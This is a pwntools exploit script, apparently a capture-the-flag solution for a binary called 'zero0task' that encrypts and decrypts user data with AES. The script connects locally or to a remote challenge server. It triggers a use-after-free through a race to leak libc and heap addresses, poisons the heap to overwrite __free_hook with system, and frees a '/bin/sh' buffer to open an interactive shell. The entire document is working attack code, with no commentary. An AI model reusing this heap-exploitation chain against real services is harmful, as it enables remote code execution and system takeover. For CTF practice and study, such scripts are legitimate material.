from pwn import *
import sys
import time
from Crypto.Cipher import AES
from binascii import b2a_hex, a2b_hex

if len(sys.argv) < 2:
    p = process("./zero0task")
    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
    elf = ELF("./zero0task")
else:
    p = remote("111.186.63.201","10001")
    libc = ELF("./libc-2.27.so")
    elf = ELF("./zero0task")

def add(ID,key,iv,size,data,encrypt = True):
    p.sendlineafter("Choice: ","1")
    p.sendlineafter("id : ",str(ID))
    if encrypt:
        p.sendlineafter("Decrypt(2): ","1")
    else:
        p.sendlineafter("Decrypt(2): ","2")
    p.sendafter("Key : ",key)
    p.sendafter("IV : ",iv)
    p.sendlineafter("Data Size : ",str(size))
    p.sendafter("Data : ",data)

def add2(ID,key,iv,size,data,encrypt = True):
    p.sendlineafter("Choice: ","1")
    p.sendlineafter("id : ",str(ID))
    if encrypt:
        p.sendlineafter("Decrypt(2): ","1")
    else:
        p.sendlineafter("Decrypt(2): ","2")
    p.sendafter("Key : ",key)
    p.sendafter("IV : ",iv)
    p.sendlineafter("Data Size : ",str(size))
    p.recvuntil("Data : ")
    time.sleep(2)
    p.send(data)

def free(ID):
    p.sendlineafter("Choice: ","2")
    p.sendlineafter("id : ",str(ID))

def go(ID):
    p.sendlineafter("Choice: ","3")
    p.sendlineafter("id : ",str(ID))

key = "\x00"*32
iv = "\x00"*16
def AESsolve(data,enc = True):
    aes_my = AES.new(key,AES.MODE_CBC,iv)
    if enc:
        return aes_my.encrypt(data)
    else:
        return aes_my.decrypt(data)

code_base = 0x555555554000
def debugf():
    gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x1724)))

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
#debugf()
add(1,key,iv,0x600,"\x00"*(0x600))
add(2,key,iv,0x10,"a"*0x10)
go(1)
free(1)
add2(1,key,iv,0x500,"\x00"*0x500)
p.recvuntil("Ciphertext: \n")
info = p.recvline() + p.recvline() + p.recvline() + p.recvline()
info = a2b_hex(info.replace(" ","").replace("\n",""))
data = AESsolve(info,False)
libc_addr = u64(data[0:8])
heap_addr = u64(data[16:24])
libc.address = libc_addr - 1232 - 0x10 - libc.symbols["__malloc_hook"]
heap_base = heap_addr - (0x84b0 - 0x7000)
log.success("libc_base:"+hex(libc.address))
log.success("heap_base:"+hex(heap_base))
#debugf()
# heap_base = 0x555555757000
add(3,key,iv,0x10,"\x00"*(0x10),False)
payload = p64(0)*5 + p64(0x81) + p64(libc.symbols["__free_hook"] - 8) + p64(0)
add(4,key,iv,len(payload),AESsolve(payload),False)
#add(4,key,iv,len(payload),payload)
go(3)
free(3)
free(4)
payload = p64(heap_base + 0x1a80 - 0x1000) + p64(0x1060) + p64(2) + p64(0)*8 + p64(heap_base + 0x2090)
payload += p64(3) + p64(0)
add(3,key,iv,0x70,payload,False)
free(1)
time.sleep(2)
#p.recvuntil("Ciphertext: \n")
payload = "/bin/sh\x00" + p64(libc.symbols["system"])
payload = payload.ljust(0x70,"\x00")
add(1000,key,iv,0x70,payload)
free(1000)
p.interactive()
